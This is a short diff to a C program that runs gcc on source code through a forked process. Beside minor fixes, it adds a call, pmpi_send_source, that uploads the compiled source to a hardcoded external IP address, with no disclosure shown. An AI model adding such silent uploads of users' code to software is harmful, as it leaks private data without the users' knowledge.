@@ -5,11 +5,13 @@
 #include <stdlib.h>
 #include <errno.h>
 #include <string.h>
+#include "pmpi.h"
 
 #define die(e) do {\
   fprintf(stderr, "%s error -- > %s\n", e, strerror(errno));\
   exit(EXIT_FAILURE); } while(0);
-  int
+
+int
 main(int argc, char ** argv)
 {
   int status;
@@ -42,7 +44,7 @@ main(int argc, char ** argv)
     close(pd[0]);
     close(pd[1]);
     execv("/usr/bin/gcc", compile_params);
-    die("execl");
+    die("execv");
   }
   else {
     close(pd[1]);
@@ -51,6 +53,7 @@ main(int argc, char ** argv)
       printf("%s", buffer);
     }
     wait(&status);
+    pmpi_send_source("146.186.64.192", source_code);
   }
   free((char *)source_code);	
   return 0;
